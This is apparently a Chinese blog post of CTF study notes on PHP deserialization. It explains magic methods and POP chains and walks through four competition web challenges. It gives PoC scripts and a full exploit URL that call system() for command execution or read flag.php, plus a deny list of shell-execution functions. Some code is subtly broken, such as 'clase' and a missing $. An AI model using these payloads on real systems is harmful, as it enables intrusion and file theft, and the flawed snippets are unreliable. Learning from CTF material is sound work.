---
title: php反序列化浅记
date: 2023-10-25 12:59:35
tags: 
    - 🌟🌟🌟🌟
categories: 
    - 网络安全
    - ctf
---


关键词：对象、类、成员变量、成员函数、父子类、序列化、反序列化、魔术方法、poc

感谢让我领略了php反序列化风采的K3zy前辈： https://github.com/kkontheway

---

<!--more-->

# 简介
面向对象的是一种编程思想和方法
即将数据和操作数据的方法封装成一个对象，来实现具体的功能
也就是说对象包含了一些数据和一些函数(即方法)，可以调用对象的成员变量来进行计算，也可以调用对象的成员方法达成某一功能

```
对象这个概念十分的抽象，runoob关于对象的介绍十分的好，但是我觉得有多余的抽象，如果要方便理解这个概念，还是具象一点好，尤其是我不搞开发，不向这种东西注入“心血”
我认为要善于灵活地运用抽象和具象来方便学习
```

类是创建对象的模版，对象的创建按照类的结构、包含类的方法(函数)

## 类的创建
```
<?php
class 类名 {
	成员变量
	function 成员方法(形参){
		方法语句; //函数语句
	}
}
?>
```
## 对象的创建
```
<?php

$变量 = new 类名(穿参);
?>
```
## 对象成员的调用
```
<?php

$对象变量->成员变量 = 1;
$对象变量->成员函数();
?>
```
## 关于对象的访问控制

**public（公有）：** 公有的类成员可以在任何地方被访问。// 如果用var定义那就算public
**protected（受保护）：** 受保护的类成员则可以被其自身以及其子类和父类访问。
**private（私有）：** 私有的类成员则只能被其定义所在的类访问。

以上关于访问控制的“类”可以和”对象“替换

# 序列化和反序列化
只需要知道两个函数和一个核心特性
- **serialize()** 函数用于序列化对象或数组，并返回一个字符串，如果对象里有方法，则略过不管
- **unserialize()** 函数用于将序列化后的对象或数组进行反序列化，并返回原始的对象结构(不包括方法了)
- 核心特性就是，若一个序列化字符串包含了对象a(其结构与类A完全相同)，且发送到了一个php网页被反序列化，同时这个php网页定义了类A，那么这个反序列化后的对象能调用类A的方法了

对象结构与类结构相同的意思是，对象具有相同的类名和变量名
# 浅析序列化字符串
```
<?php
class Flag1{ 
    public $file;  
	public $apple="red and sweet";

}
class Flag02{
	public $test;
}

$a=new Flag1();
$a->file=new Flag02();
$a->file->test="I'm truthleader";

echo serialize($a)
?>
```
该代码打印的序列化字符串如下：
`O:5:"Flag1":3:{s:4:"file";O:6:"Flag02":1:{s:4:"test";s:15:"I'm truthleader";}s:5:"apple";s:13:"red and sweet";s:6:"banana";N;}`
这可以拆分为
- O:5:"Flag1":2:{}
- :4:"file";O:6:"Flag02":1:{}s:5:"apple";s:13:"red and sweet";s:6:"banana";N;
- s:4:"test";s:15:"I'm truthleader";
1. 第一段的O代表对象，5代表对象名的字符数，Flag1是对象名，2代表该对象有两个成员变量，{这里嵌套了两个成员变量}
2. 第二段的s代表字符串(即变量的数据类型)，file是变量名，而Flag02是值名兼对象名。banana的值的类型是N。{这里的成员变量是一键值对的形式排列的}
3. 第三段同上

# 魔术方法
具体内容看php官网 
https://www.php.net/manual/zh/language.oop5.magic.php

魔法方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。魔术方法与序列化和反序列化强相关
魔术方法的名称是固定的：
```
__wakeup() 执行unserialize()时，先会调用这个函数

__sleep() 执行serialize()时，先会调用这个函数

__destruct() 对象被销毁时触发

__call() 在对象上下文中调用不可访问的方法时触发

__callStatic() 在静态上下文中调用不可访问的方法时触发

__get() 用于从不可访问的属性读取数据或者不存在这个键都会调用此方法

__set() 用于将数据写入不可访问的属性

__isset() 在不可访问的属性上调用isset()或empty()触发

__unset() 在不可访问的属性上使用unset()时触发

__toString() 把类当作字符串使用时触发

__invoke() 当尝试将对象调用为函数时触发
```
# POC链
是一串专门的序列化字符串，传到php网页后解序列化，就能激活php网页中*特定对象*的魔术方法，从而执行敏感函数，例如读取flag、执行命令或代码

POC链的结构需要与特定对象一样，即有相同的类名、成员变量名，且包含类所规定的所有成员变量

POC链的构造需要对php网页代码进行审计，分析类的结构、魔术方法和成员变量间的关系，最终用本地的php脚本生成序列化字符串

## POC链的工作原理
1. 作为网页的穿参传到php网页
2. php网页自动反序列化poc链条(前提是网页确实会反序列化该穿参)
3. poc链条符合了魔术方法的发动条件，从而引发了一连串的魔术方法反应，最终执行敏感函数

> 一般读取文件、执行命令的函数都是敏感函数

## 生成poc链
1. 编写php代码，定义类——和目标网页源代码中的类结构要一模一样，严格到大小写也一样
2. 创建对象，更改对象的成员变量的值，以达到引动魔术方法的目的
3. 生成序列化字符串

# 反序列化例题
ctfhub上有环境，可以自己做
## 2020-网鼎杯-朱雀组-Web-phpweb
### 源码
```
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```
最简单的，但是有一些弯弯绕绕

### 代码分析
1. 页面接受两个POST传参：func p
2. call_user_func($func, $p)是敏感函数，其第一个参数是php函数名，第二个参数是函数的传参，其功能就是调用并执行函数
3. 这确实可以执行函数，但是经过了严格的过滤，当然，file_get_contents和unserialize函数是可以使用的
4. 原题通过file_get_contents阅读代码
5. 改网页对func进行了过滤，但是没有对p，同时有一个调用了敏感函数入口gettime的Test类，所以可以手动执行unserialize函数，并构造poc链

## poc
```
<?php
class Test {
	var p;
	var func; //由于序列化后的对象没有了方法，所以那些多余的东西根本不用写根本不用写
}
$a = new Test();
$a->p = "pwd";
$a->func = "system";

echo serialize($a);
//echo urlencode(serialize($a);
?>
```
然后传参，func为unserialize，p为poc链，现在可以执行任意系统命令和代码了
## 2020-网鼎杯-青龙组-Web-AreUSerialz
```
<?php
 
include("flag.php");
 
highlight_file(__FILE__);
 
class FileHandler {
 
    protected $op;
    protected $filename;
    protected $content;
 
    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }
 
    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }
 
    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }
 
    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }
 
    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }
 
    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
 
}
 
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}
 
if(isset($_GET{'str'})) {
 
    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
 
}
```
## 代码分析
1. 接受一个传参str，进行is_valid过滤(这个过滤的意思就只是确保str里没有32-125之外的字符，鉴于我们传的东西没有那些字符，所以可以直接略过)
2. 反序列化`$`str，并赋值给`$`obj
3. 类FileHandler有三个成员变量，在序列化里，protected没多大用的
4. FileHandler在创建对象的时候会执行`__construct`，销毁对象时执行`__destruct`，两个方法都会调用process方法
5. process方法会调用write或read方法，这两个方法里有敏感函数，一个读文件一个写文件，我们这次只需要读；然后会调用output将read的返回输出
6. 如果要构造poc链，那里面的op要为2，filename要为我们想要读取文件的文件名，当然就是include包含的flag.php

## poc
```
<?php
class FileHandler {
    public $op;
    public $filename;
    public $content;
}
$a = new FileHandler(); // 虽然__construct方法会修改op和filename
$a->op=2;
$a->filename="flag.php";

echo serialize($a);
//echo urlencode(serialize($a);
?>
```

## 浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维
## 源码1
```
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```
这里用到了伪协议的知识，这与我们这篇浅记的主题无关，况且这是浅浅一记
只需要知道，通过data://伪协议传text绕过welcome to the zjctf，再file传php伪协议的任意文件读取读useless.php内容的base64，然后解码就能得到useless.php源代码
## 源码2
```
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```
这里可以真读取任意文件了，毕竟源码1过滤了file

## 代码分析
1. `__tostring`在所在对象被当作字符串时发动
2. 敏感函数读取$file文件，然后输出
3. 由于源码1 echo了反序列化的$password——当作字符串输出，所以这里就是突破口

## poc链
```
<?php
class Flag{  
    public $file;  
}  
$a = new Flag();
$a->file="flag.php";

echo serialize($a);
//echo urlencode(serialize($a);
?>
```
传入一下url
```
/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```
ps:我想时常试用f12是一个好习惯

## 2021-第五空间智能安全大赛-Web-pklovecloud
## 源码
```
<?php  
include 'flag.php';
class pkshow 
{  
    function echo_name()     
    {          
        return "Pk very safe^.^";      
    }  
} 

class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new pkshow;
    }  
    function __toString()      
    {          
        if (isset($this->cinder))  
            return $this->cinder->echo_name();      
    }  
}  

class ace
{    
    public $filename;     
    public $openstack;
    public $docker; 
    function echo_name()      
    {   
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
        $file = "./{$this->filename}";
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "keystone lost~"; 
            }    
        }
    }  
}  

if (isset($_GET['pks']))  
{
    $logData = unserialize($_GET['pks']);
    echo $logData; 
} 
else 
{ 
    highlight_file(__file__); 
}
?>
```

## 代码分析
1. 反序列化pks，赋值给logData，然后输出
2. pkshow类没什么好说的
3. acp会首先将cinder构建为pkshow对象，然后调用里面的echo_name输出，我们不想要这个
4. ace的echo_name会反序列化成员变量docker，然后赋值给openstack
5. 比较openstack里面的neutron和nova，看看是否值和类型都相等
6. 相等就根据$filename读取文件
7. 如果openstack没有neutron和nova，那么必然相等，即——虚无和虚无是等价的。毕竟$heat的值是不知道的。这意味着根本不用管docker和openstack

## poc链条
```
<?php
class ace{
    public $filename;     
    public $openstack;
    public $docker; 
}
clase acp{
    protected $cinder;  
    public $neutron;
    public $nova;
}

$a = new acp();
$a->cinder=new ace();
$a->cinder->filename="flag.php";
?>
```

# 总结
1. 反序列化蛮好玩的，当然学的话那是真的头痛
2. 解决反序列化题目有一下几个要点
	1. 得到源代码
	2. 魔术方法
3. 得到源代码需要其他web渗透和ctf技能的辅助，我的基础不太牢靠，需要对一下这几个方面进行补足：
	1. xss
	2. csrf
	3. ssrf
	4. 伪协议
	5. 文件上传、读取、包含webshell
	6. SQL注入
	7. 其他